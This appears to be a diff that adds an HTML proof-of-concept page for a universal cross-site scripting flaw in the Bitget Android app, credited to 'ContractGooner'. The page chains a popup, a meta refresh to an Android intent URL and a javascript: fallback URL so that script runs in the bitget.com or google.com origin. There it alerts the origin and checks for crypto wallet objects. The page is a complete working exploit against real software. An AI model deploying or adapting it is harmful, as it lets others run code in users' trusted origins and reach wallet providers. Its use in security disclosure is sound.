@@ -1,0 +1,67 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Bitget Android UXSS PoC</title>
+<style>
+  body { font: 17px/1.5 system-ui; max-width: 42rem; margin: 3rem auto; padding: 0 1rem; }
+  h1 { font-size: 1.7rem; }
+  pre { white-space: pre-wrap; overflow-wrap: anywhere; background: #f2f4f5; padding: 1rem; }
+</style>
+<h1>Bitget Android UXSS PoC</h1>
+<p>PoC by ContractGooner</p>
+<pre id="status">arming…</pre>
+<script>
+(() => {
+  'use strict';
+  const params = new URL(location.href).searchParams;
+  const google = params.get('target') === 'google';
+  const target = google
+    ? 'https://www.google.com/robots.txt'
+    : 'https://www.bitget.com/';
+  const delay = Number(params.get('delay') || (google ? 1800 : 5000));
+  const status = document.querySelector('#status');
+
+  const proofHtml = '<head><meta name="viewport" content="width=device-width,initial-scale=1">' +
+    '<title>PoC_by_ContractGooner</title><style>body{font:20px/1.5 system-ui;padding:2rem}' +
+    'pre{white-space:pre-wrap;overflow-wrap:anywhere}</style></head>' +
+    '<body id="contractgooner"><h1>PoC_by_ContractGooner</h1><pre id="proof"></pre></body>';
+  const proofSource = [
+    '(()=>{',
+    'const o=origin;',
+    'window.stop();',
+    'const providers={bitkeep:typeof window.bitkeep,ethereum:typeof window.ethereum,solana:typeof(window.bitkeep&&window.bitkeep.solana)};',
+    'alert(origin);',
+    'document.documentElement.innerHTML=' + JSON.stringify(proofHtml) + ';',
+    'document.querySelector("#proof").textContent=JSON.stringify({marker:"PoC_by_ContractGooner",origin:o,href:location.href,domain:document.domain,providers},null,2);',
+    '})()'
+  ].join('');
+  const fallback = 'javascript:' + encodeURIComponent(proofSource);
+  const intent = 'intent://forms.gle/contractgooner#Intent;' +
+    'scheme=contractgooner-no-handler;' +
+    'S.browser_fallback_url=' + encodeURIComponent(fallback) + ';end';
+
+  function run() {
+    const nonce = String(Date.now());
+    const trigger = open('about:blank', 'bitget_uxss_trigger_' + nonce);
+    if (!trigger) {
+      status.textContent = 'Popup was blocked; the Bitget-specific primitive was not reached.';
+      return;
+    }
+
+    const escapedIntent = intent.replaceAll('&', '&amp;').replaceAll('"', '&quot;');
+    trigger.document.open();
+    trigger.document.write(
+      '<!doctype html><meta http-equiv="refresh" content="' + (delay / 1000) +
+      ';url=' + escapedIntent + '"><title>detached trigger</title>'
+    );
+    trigger.document.close();
+
+    status.textContent = 'Target: ' + target + '\nDetached trigger: ' + delay + ' ms';
+    setTimeout(() => {
+      open(target, 'bitget_uxss_target_' + nonce);
+    }, 250);
+  }
+
+  addEventListener('load', () => setTimeout(run, 750), {once: true});
+})();
+</script>
